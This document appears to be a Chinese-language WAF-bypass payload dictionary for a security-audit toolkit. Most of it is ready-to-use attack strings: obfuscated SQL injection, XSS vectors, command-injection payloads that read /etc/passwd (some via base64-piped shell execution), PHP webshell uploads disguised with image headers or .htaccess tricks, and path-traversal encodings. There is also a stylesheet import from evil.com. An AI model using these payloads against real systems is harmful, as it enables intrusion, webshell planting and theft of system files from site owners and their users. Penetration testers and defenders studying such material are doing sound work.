# WAF 绕过策略字典

供所有 Phase 4 审计器参考的通用 WAF 绕过技术。

---

## 通用绕过技术

### 编码绕过
| 技术 | 示例 | 适用场景 |
|------|------|---------|
| URL 编码 | `%27` → `'` | 基础 WAF |
| 双重 URL 编码 | `%2527` → `%27` → `'` | 解码一次的 WAF |
| Unicode 编码 | `\u0027` → `'` | JS 解析场景 |
| HTML 实体 | `&#39;` → `'` | HTML 输出场景 |
| Hex 编码 | `\x27` → `'` | PHP/JS 场景 |
| UTF-8 超长编码 | `%c0%a7` → `/` | 旧系统 |

### HTTP 层绕过
| 技术 | 说明 |
|------|------|
| HPP（参数污染） | `?id=1&id=2' OR 1=1--` 后端取最后一个 |
| Content-Type 混淆 | `multipart/form-data` 替代 `application/x-www-form-urlencoded` |
| 分块传输 | `Transfer-Encoding: chunked` 分割 Payload |
| HTTP/2 | 某些 WAF 不检查 HTTP/2 请求 |
| 方法覆盖 | `X-HTTP-Method-Override: PUT` |
| 大小写混合 | `SeLeCt`, `UnIoN`, `ScRiPt` |
| 超长请求体 | Payload 前填充大量合法数据 |

### SQL 注入绕过
| 技术 | 示例 |
|------|------|
| 内联注释 | `/*!50000SELECT*/` |
| 多行注释 | `/**/UNION/**/SELECT/**/` |
| 换行 | `--\nSELECT` |
| 科学计数法 | `1e0UNION` |
| 空格替代 | `%09`, `%0a`, `%0b`, `%0c`, `%0d`, `%a0`, `/**/` |
| 等价函数 | `MID()` → `SUBSTR()` → `SUBSTRING()` |
| 字符串拼接 | `CONCAT('SE','LECT')` |

### XSS 绕过
| 技术 | 示例 |
|------|------|
| 大小写 | `<ScRiPt>` |
| 无空格 | `<svg/onload=alert(1)>` |
| 编码事件 | `<img src=x onerror=&#97;lert(1)>` |
| 模板语法 | `{{constructor.constructor('alert(1)')()}}` |
| SVG | `<svg><animate onbegin=alert(1)>` |
| 数据 URI | `<a href=data:text/html,<script>alert(1)</script>>` |

### 命令注入绕过
| 技术 | 示例 |
|------|------|
| IFS | `cat${IFS}/etc/passwd` |
| Tab | `cat%09/etc/passwd` |
| 通配符 | `/bin/ca? /etc/pas*` |
| 反引号 | `` `id` `` |
| $() | `$(id)` |
| 换行 | `%0aid` |
| 花括号 | `{ls,/tmp}` |

---

## 按 WAF 类型的特定绕过

### Cloudflare
- 利用 Worker 路由差异
- Unicode 标准化差异
- Chunked + Content-Length 混淆
- 绕过源: 查找源站 IP（DNS 历史、邮件头、证书）

### ModSecurity (OWASP CRS)
- Paranoia Level 1: 基础绕过即可
- Paranoia Level 2: 需要编码 + 注释组合
- Paranoia Level 3-4: 需要高级混淆

### 宝塔 WAF
- URL 编码变体绕过
- Nginx 路径解析差异
- POST body 编码混淆

### 安全狗
- 分块传输绕过
- 参数名混淆
- Multipart 边界混淆

---

## SQLi WAF 绕过

针对 SQL 注入场景的 WAF 绕过策略，覆盖关键字检测、语法分析、语义分析等多层防御。

### XML Entity Encoding（XML 实体编码）

| 项目 | 内容 |
|------|------|
| **Payload** | `&#x55;NION &#x53;ELECT` → 解码后为 `UNION SELECT` |
| **原理** | WAF 对原始请求体做关键字匹配时，XML 实体编码的字符不会被识别为 SQL 关键字；但后端 XML 解析器会还原实体，最终拼入 SQL |
| **适用场景** | 后端接收 XML 格式请求体（SOAP 接口、REST XML API）时，WAF 未对 XML body 做实体解码即检测 |

### Comment Splitting（注释拆分关键字）

| 项目 | 内容 |
|------|------|
| **Payload** | `UN/**/ION`, `SEL/**/ECT`, `UN/*xxx*/ION+SEL/*yyy*/ECT` |
| **原理** | MySQL 允许在关键字中间插入 `/**/` 多行注释，数据库忽略注释后拼回完整关键字；WAF 的正则若按完整单词匹配则无法命中 |
| **适用场景** | 基于正则表达式做关键字匹配的 WAF（如低版本 ModSecurity CRS）；对 MySQL 后端有效，PostgreSQL/MSSQL 部分支持 |

### Mixed Case + Double Write（大小写混合 + 双写绕过）

| 项目 | 内容 |
|------|------|
| **Payload** | `UNunionION SeLselectECT`，WAF 删除 `union`/`select` 后剩余 `UNION SELECT` |
| **原理** | 部分 WAF 采用"删除黑名单关键字"策略而非拦截；双写使得删除一次后仍然构成有效关键字 |
| **适用场景** | 采用 replace/strip 策略而非 block 策略的 WAF；常见于自研 WAF 和低版本安全狗 |

### Hex Encoded Strings（十六进制编码字符串）

| 项目 | 内容 |
|------|------|
| **Payload** | `SELECT * FROM users WHERE name=0x61646d696e`（`0x61646d696e` = `'admin'`） |
| **原理** | MySQL 支持 `0x` 前缀的十六进制字符串字面量，WAF 对字符串值的检测通常针对引号包裹的明文 |
| **适用场景** | WAF 检测 SQL 字符串值中的敏感词（如 `admin`, `root`）时；仅对 MySQL 有效 |

### Whitespace Alternatives（空白符替代）

| 项目 | 内容 |
|------|------|
| **Payload** | `UNION%0aSELECT`, `UNION%0dSELECT`, `UNION%a0SELECT`, `UNION%09SELECT` |
| **原理** | SQL 解析器将 `\n`(0x0a), `\r`(0x0d), `\t`(0x09), 不间断空格(0xa0) 均视为合法空白符；WAF 可能仅匹配 `0x20` 普通空格 |
| **适用场景** | WAF 使用 `UNION\s+SELECT` 类正则且 `\s` 未覆盖所有空白字符时 |

### MySQL Conditional Comments（MySQL 条件注释）

| 项目 | 内容 |
|------|------|
| **Payload** | `/*!50000UNION*/ /*!50000SELECT*/ 1,2,3` |
| **原理** | MySQL 特有语法 `/*!NNNNN ... */`：当版本号 >= NNNNN 时，注释内的代码会被执行。WAF 将其视为普通注释忽略 |
| **适用场景** | 针对 MySQL >= 5.x 的场景；绕过将 `/* */` 内容直接丢弃的 WAF |

### Equivalent Functions（等价函数替换）

| 项目 | 内容 |
|------|------|
| **Payload** | `SUBSTR()` → `MID()` / `LEFT()` / `RIGHT()`；`ASCII()` → `ORD()`；`IF()` → `CASE WHEN ... THEN ... END` |
| **原理** | WAF 黑名单通常只覆盖常见函数名，使用功能等价但名称不同的函数可绕过 |
| **适用场景** | WAF 基于函数名黑名单检测时；不同数据库的等价函数不同，需根据后端选择 |

### JSON/Object Syntax（JSON 语法注入）

| 项目 | 内容 |
|------|------|
| **Payload** | MySQL 8.0+: `SELECT JSON_EXTRACT('{"a":1}','$.a') UNION SELECT password FROM users` |
| **原理** | 利用 JSON 函数和 JSON 字面量中的引号/括号混淆 WAF 的语法分析树 |
| **适用场景** | MySQL 8.0+、PostgreSQL 的 JSONB 操作符场景；现代 WAF 对 JSON SQL 函数覆盖不全 |

### ORDER BY / GROUP BY Injection（排序注入）

| 项目 | 内容 |
|------|------|
| **Payload** | `ORDER BY IF(1=1,1,(SELECT 1 FROM information_schema.tables))` |
| **原理** | WAF 通常聚焦于 WHERE 子句的注入检测，对 ORDER BY 位置的子查询检测较弱 |
| **适用场景** | 注入点在排序参数时；可用于盲注数据提取 |

---

## XSS WAF 绕过

针对跨站脚本攻击场景的 WAF 绕过策略，覆盖标签检测、事件处理器检测、JavaScript 函数检测等层面。

### Unicode Case Folding（Unicode 大小写折叠）

| 项目 | 内容 |
|------|------|
| **Payload** | `<ſcript>alert(1)</ſcript>`，其中 `ſ`(U+017F, Latin Small Letter Long S) 经 `toUpperCase()` 折叠为 `S` |
| **原理** | 浏览器或后端对 HTML 标签名做大小写标准化时，Unicode 字符 `ſ` 被折叠为 `S`，使 `ſcript` 变为 `SCRIPT`；WAF 的字节级匹配无法识别 |
| **适用场景** | 后端或浏览器对输入做 `strtoupper()` / `toUpperCase()` 处理后输出到 HTML 的场景 |

### HTML Entity Mixing（HTML 实体混合编码）

| 项目 | 内容 |
|------|------|
| **Payload** | `&#60;script&#62;alert(1)&#60;/script&#62;`，或混合十进制/十六进制 `&#x3c;script&#62;` |
| **原理** | WAF 对原始输入做 `<script>` 匹配时，HTML 实体编码形式不会命中；但浏览器渲染 HTML 时会解码实体 |
| **适用场景** | 输出点在 HTML 属性值或 HTML body 中、且 WAF 未做实体解码预处理的场景 |

### Alternative Event Handlers（替代事件处理器）

| 项目 | 内容 |
|------|------|
| **Payload** | `<input onfocus=alert(1) autofocus>`, `<body onpageshow=alert(1)>`, `<marquee onstart=alert(1)>`, `<details ontoggle=alert(1) open>` |
| **原理** | WAF 黑名单通常只覆盖 `onerror`/`onload`/`onclick` 等常见事件；HTML5 引入了大量新事件处理器 |
| **适用场景** | WAF 基于事件名黑名单检测时；`autofocus`/`open` 等属性可触发事件无需用户交互 |

### No-Parenthesis Function Call（无括号函数调用）

| 项目 | 内容 |
|------|------|
| **Payload** | `` alert`1` ``（Tagged Template Literal），`throw onerror=alert,1` |
| **原理** | JavaScript 的 Tagged Template Literal 语法允许不使用括号调用函数；WAF 检测 `alert(` 模式时无法匹配 |
| **适用场景** | WAF 通过匹配 `函数名(` 模式检测 JavaScript 调用时；现代浏览器均支持 |

### SVG / MathML Namespace（SVG/MathML 命名空间）

| 项目 | 内容 |
|------|------|
| **Payload** | `<svg><script>alert(1)</script></svg>`, `<math><mtext><script>alert(1)</script></mtext></math>` |
| **原理** | SVG 和 MathML 拥有独立的解析规则和命名空间，HTML sanitizer 和 WAF 可能不对这些命名空间内的内容做完整检测 |
| **适用场景** | 使用 DOMPurify 等 sanitizer 的旧版本、或 WAF 未覆盖 SVG/MathML 解析的场景 |

### JavaScript Protocol（javascript: 协议）

| 项目 | 内容 |
|------|------|
| **Payload** | `<a href="javascript:alert(1)">`, `<a href="&#106;avascript:alert(1)">`, `<a href="java%0ascript:alert(1)">` |
| **原理** | 在 `href`/`src`/`action` 等属性中使用 `javascript:` 协议执行代码；通过实体编码、换行符等混淆协议名 |
| **适用场景** | 注入点在 HTML 属性值中（尤其 `href`），WAF 未对属性值做协议检测时 |

### DOM Clobbering（DOM 命名覆盖）

| 项目 | 内容 |
|------|------|
| **Payload** | `<form id="x"><input name="y" value="javascript:alert(1)">` 使 `document.getElementById('x').y.value` 可控 |
| **原理** | 通过 HTML 元素的 `id`/`name` 属性覆盖 DOM 中的全局变量或对象属性，间接影响 JavaScript 执行流 |
| **适用场景** | 目标页面的 JavaScript 代码从 DOM 读取值并拼接执行时；WAF 无法检测这种间接攻击 |

### Mutation XSS（mXSS，突变型 XSS）

| 项目 | 内容 |
|------|------|
| **Payload** | `<listing>&lt;img src=1 onerror=alert(1)&gt;</listing>`，浏览器解析后 `&lt;` 被还原为 `<` |
| **原理** | 浏览器的 HTML 解析器在序列化-反序列化过程中会改变 DOM 结构（mutation），使原本安全的 HTML 变为危险内容 |
| **适用场景** | 使用 `innerHTML` 赋值的场景；绕过服务端 sanitizer 检测，依赖浏览器端解析差异 |

### Expression / CSS Injection（表达式/CSS 注入）

| 项目 | 内容 |
|------|------|
| **Payload** | `<div style="background:url(javascript:alert(1))">` (IE), `<style>@import 'http://evil.com/xss.css';</style>` |
| **原理** | 通过 CSS 属性值注入 JavaScript（旧版 IE）或通过 CSS @import 加载外部恶意样式表 |
| **适用场景** | 需兼容旧版 IE 的目标；或注入点在 `<style>` 标签/`style` 属性内时 |

---

## 命令注入 WAF 绕过

针对操作系统命令注入场景的 WAF 绕过策略，覆盖命令名黑名单、特殊字符过滤、参数过滤等层面。

### 命令替代（Command Alternatives）

| 项目 | 内容 |
|------|------|
| **Payload** | `cat` 被禁 → `sed -n p /etc/passwd`, `awk '{print}' /etc/passwd`, `tac /etc/passwd`, `nl /etc/passwd`, `head /etc/passwd`, `tail /etc/passwd`, `sort /etc/passwd`, `uniq /etc/passwd`, `rev /etc/passwd \| rev` |
| **原理** | WAF 黑名单通常覆盖 `cat`/`more`/`less` 等常见文件读取命令，但 Linux 有大量功能等价的工具 |
| **适用场景** | WAF 基于命令名黑名单检测时；适用于所有 Linux 环境 |

### 空格绕过（Space Bypass）

| 项目 | 内容 |
|------|------|
| **Payload** | `cat${IFS}/etc/passwd`, `cat$IFS$9/etc/passwd`, `{cat,/etc/passwd}`, `cat</etc/passwd`, `X=$'\x20';cat${X}/etc/passwd` |
| **原理** | `$IFS`（Internal Field Separator）默认值为空格+Tab+换行；花括号展开和输入重定向也可替代空格 |
| **适用场景** | WAF 过滤空格字符（0x20）时；Bash 环境下均有效 |

### 通配符绕过（Wildcard Bypass）

| 项目 | 内容 |
|------|------|
| **Payload** | `c?t /e?c/p?sswd`, `/???/??t /???/p??s??`, `cat /etc/pass*`, `cat /etc/passw[a-z]` |
| **原理** | Shell 的 glob 通配符 `?`（单字符）、`*`（任意字符）、`[...]`（字符集）会在命令执行前由 shell 展开 |
| **适用场景** | WAF 匹配完整命令名或完整路径时；所有 POSIX shell 均支持 |

### 变量拼接（Variable Concatenation）

| 项目 | 内容 |
|------|------|
| **Payload** | `a=c;b=at;$a$b /etc/passwd`, `$(echo cat) /etc/passwd`, `` `echo cat` /etc/passwd `` |
| **原理** | Shell 变量赋值后拼接执行，或通过命令替换动态生成命令名；WAF 在静态分析阶段无法还原 |
| **适用场景** | WAF 做静态字符串匹配时；需要目标支持多语句执行（分号或换行） |

### 编码执行（Encoded Execution）

| 项目 | 内容 |
|------|------|
| **Payload** | `echo Y2F0IC9ldGMvcGFzc3dk \| base64 -d \| sh`（Base64 编码的 `cat /etc/passwd`） |
| **原理** | 将完整命令 Base64 编码后通过管道解码执行；WAF 无法识别 Base64 编码内的命令 |
| **适用场景** | 目标系统有 `base64` 命令且允许管道操作时；可绕过几乎所有关键字检测 |

### 反斜杠/引号插入（Backslash/Quote Insertion）

| 项目 | 内容 |
|------|------|
| **Payload** | `c\at /etc/passwd`, `c''at /etc/passwd`, `c""at /etc/passwd`, `w'h'o'a'm'i` |
| **原理** | Bash 中反斜杠转义普通字符结果不变，空引号对拼接无影响；`c\at` = `c''at` = `cat` |
| **适用场景** | WAF 按完整命令名匹配时；所有 Bash 环境有效，sh 环境部分支持 |

### 十六进制/八进制执行（Hex/Octal Execution）

| 项目 | 内容 |
|------|------|
| **Payload** | `$'\x63\x61\x74' /etc/passwd`（`\x63\x61\x74` = `cat`），`$'\143\141\164' /etc/passwd`（八进制） |
| **原理** | Bash 的 `$'...'` 语法支持十六进制（`\xNN`）和八进制（`\NNN`）转义序列 |
| **适用场景** | 需要 Bash 环境（sh 不支持 `$'...'`）；可绕过所有基于明文关键字的检测 |

### 时间盲注（Time-Based Blind）

| 项目 | 内容 |
|------|------|
| **Payload** | `; if [ $(whoami \| cut -c1) = r ]; then sleep 5; fi` |
| **原理** | 当命令输出被 WAF 拦截或无回显时，通过条件延时逐字符提取信息 |
| **适用场景** | 无回显命令注入场景；WAF 拦截响应内容但不拦截请求时 |

---

## 文件上传 WAF 绕过

针对文件上传场景的 WAF 绕过策略，覆盖文件类型检测、文件名检测、文件内容检测等层面。

### Content-Type Forgery（MIME 类型伪造）

| 项目 | 内容 |
|------|------|
| **Payload** | 上传 PHP webshell 时设置 `Content-Type: image/jpeg`，文件内容为 `<?php system($_GET['cmd']); ?>` |
| **原理** | 部分 WAF 和后端仅检查 HTTP 请求中的 `Content-Type` 头判断文件类型，不检查实际文件内容 |
| **适用场景** | 服务端依赖客户端提交的 MIME 类型做校验时；PHP 环境下最为常见 |

### Double Extension（双扩展名）

| 项目 | 内容 |
|------|------|
| **Payload** | `shell.php.jpg`, `shell.php%00.jpg`（Null Byte 截断）, `shell.php\x00.jpg` |
| **原理** | WAF 检查最终扩展名 `.jpg` 判定为图片放行；但 Apache 的 `AddHandler` 或 Nginx 配置可能按第一个可识别扩展名 `.php` 执行；Null Byte 截断使 C 层函数在 `%00` 处终止字符串 |
| **适用场景** | Apache + `AddHandler php-script .php` 配置；PHP < 5.3.4 的 Null Byte 截断（CVE-2006-7243） |

### Extension Alternatives（扩展名替代）

| 项目 | 内容 |
|------|------|
| **Payload** | `.phtml`, `.php5`, `.php7`, `.phar`, `.phps`, `.pht`, `.pgif`, `.shtml`, `.inc` |
| **原理** | Apache/Nginx 的 PHP handler 配置可能将这些扩展名都映射到 PHP 解析器；WAF 黑名单通常只覆盖 `.php` |
| **适用场景** | Apache 使用 `AddType application/x-httpd-php` 映射多种扩展名时；需先探测哪些扩展名可被执行 |

### Mixed Case Extension（扩展名大小写混合）

| 项目 | 内容 |
|------|------|
| **Payload** | `shell.PhP`, `shell.pHp`, `shell.PHP`, `shell.Php` |
| **原理** | Windows 文件系统不区分大小写，`.PhP` 等同于 `.php`；WAF 若使用大小写敏感匹配则无法命中 |
| **适用场景** | Windows 服务器（IIS + PHP, XAMPP, WAMP）；Linux 下无效（文件系统大小写敏感） |

### Multipart Boundary Manipulation（multipart 边界操纵）

| 项目 | 内容 |
|------|------|
| **Payload** | 在 `Content-Disposition` 中添加额外参数：`filename="shell.jpg"; filename="shell.php"`，或使用换行拆分头部 |
| **原理** | WAF 和后端对 multipart 头部的解析差异——WAF 取第一个 `filename`，后端取最后一个（或反之） |
| **适用场景** | WAF 与后端 multipart 解析器实现不一致时；需针对具体 WAF 测试解析顺序 |

### Magic Bytes Prepend（文件头伪造）

| 项目 | 内容 |
|------|------|
| **Payload** | 在 PHP 代码前添加 GIF 文件头：`GIF89a<?php system($_GET['cmd']); ?>`，或添加 JPEG 头 `\xFF\xD8\xFF\xE0` |
| **原理** | WAF 通过检查文件头的 magic bytes 判断文件类型；在恶意代码前添加合法文件头可通过检测 |
| **适用场景** | WAF 或后端使用 `getimagesize()`/`finfo_file()` 等函数做文件类型检测时 |

### .htaccess Upload（上传配置文件）

| 项目 | 内容 |
|------|------|
| **Payload** | 上传 `.htaccess` 内容为 `AddType application/x-httpd-php .jpg`，随后上传 `shell.jpg` |
| **原理** | Apache 允许目录级 `.htaccess` 覆盖配置；上传后使 `.jpg` 文件被 PHP 引擎解析 |
| **适用场景** | Apache + AllowOverride All 配置时；需上传目录允许写入 `.htaccess` |

---

## 路径穿越 WAF 绕过

针对路径穿越（Path Traversal / Directory Traversal）场景的 WAF 绕过策略，覆盖 `../` 检测、路径规范化等层面。

### Double URL Encoding（双重 URL 编码）

| 项目 | 内容 |
|------|------|
| **Payload** | `%252e%252e%252f` → 第一次解码 → `%2e%2e%2f` → 第二次解码 → `../` |
| **原理** | WAF 只做一次 URL 解码看到 `%2e%2e%2f`（不匹配 `../`），但后端做两次解码后得到 `../` |
| **适用场景** | 后端存在两次 URL 解码（如 Tomcat 某些配置、自定义解码逻辑）的场景 |

### Brace / Dot Manipulation（花括号/点号变体）

| 项目 | 内容 |
|------|------|
| **Payload** | `{.}{.}/`, `{..}/`, `.{.}/` |
| **原理** | 某些 Web 服务器或框架的路径解析器会将花括号内的内容展开或忽略花括号，使 `{.}{.}/` 等价于 `../` |
| **适用场景** | 特定 Web 服务器（如某些 Java 应用服务器）的路径解析差异；需针对目标实测 |

### UTF-8 Overlong Encoding（UTF-8 超长编码）

| 项目 | 内容 |
|------|------|
| **Payload** | `%c0%ae%c0%ae/`（`.` 的超长编码为 `%c0%ae`），`%c0%af`（`/` 的超长编码） |
| **原理** | UTF-8 标准禁止超长编码，但旧版解析器可能接受。`.` 正常编码为 `0x2e`（1 字节），超长编码为 `0xc0 0xae`（2 字节）；WAF 不识别超长编码但后端还原 |
| **适用场景** | 旧版 Java 应用服务器（如 Tomcat < 某些版本）、IIS 6.0 等存在超长编码解析的系统 |

### Mixed Slashes（混合斜杠）

| 项目 | 内容 |
|------|------|
| **Payload** | `..\/etc/passwd`, `..\\/etc/passwd`, `../\../etc/passwd` |
| **原理** | Windows 同时接受 `/` 和 `\` 作为路径分隔符；混合使用可绕过仅检测 `../` 或 `..\` 单一模式的 WAF |
| **适用场景** | Windows 服务器（IIS, XAMPP）；部分 Java 应用在 Windows 上也接受混合斜杠 |

### Path Normalization Bypass（路径规范化差异）

| 项目 | 内容 |
|------|------|
| **Payload** | `/etc/passwd` → `//etc////passwd`, `/etc/./passwd`, `/etc/nothing/../passwd` |
| **原理** | 多余的 `/`、`./`（当前目录）、`xxx/../`（进入再返回）在路径规范化后等价于原路径；WAF 的模式匹配可能无法处理 |
| **适用场景** | WAF 对路径做精确字符串匹配（如黑名单 `/etc/passwd`）而非规范化后匹配时 |

### Null Byte Injection（空字节注入）

| 项目 | 内容 |
|------|------|
| **Payload** | `../../etc/passwd%00.jpg`, `../../etc/passwd\0.png` |
| **原理** | C 语言的字符串以 `\0` 结尾；PHP < 5.3.4 中 `%00` 会截断文件路径，使 `.jpg` 后缀被丢弃 |
| **适用场景** | PHP < 5.3.4, 旧版 Perl/CGI；现代 PHP 已修复此问题 |

### URL Encoding Variants（URL 编码变体）

| 项目 | 内容 |
|------|------|
| **Payload** | `%2e%2e%2f`（`../`）, `%2e%2e/`, `..%2f`, `%2e%2e%5c`（`..\`） |
| **原理** | 对 `../` 中的部分字符做 URL 编码；WAF 可能匹配字面 `../` 但不匹配部分编码形式 |
| **适用场景** | WAF 未对输入做完整 URL 解码即检测时；最基础但仍然有效的绕过方式 |

---

## 使用指南

1. 先使用 `tools/waf_detector.php` 识别 WAF 类型
2. 根据 WAF 类型选择对应绕过策略
3. 每种策略与 `tools/payload_encoder.php` 配合使用
4. 从最简单的绕过开始，逐步升级复杂度
5. **SQLi 绕过**: 先测试注释拆分和大小写混合，再尝试编码类绕过
6. **XSS 绕过**: 先测试替代事件处理器，再尝试编码和命名空间绕过
7. **命令注入绕过**: 先测试变量拼接和引号插入，再尝试编码执行
8. **文件上传绕过**: 先测试扩展名替代和大小写，再尝试 multipart 操纵
9. **路径穿越绕过**: 先测试 URL 编码变体，再尝试双重编码和超长编码
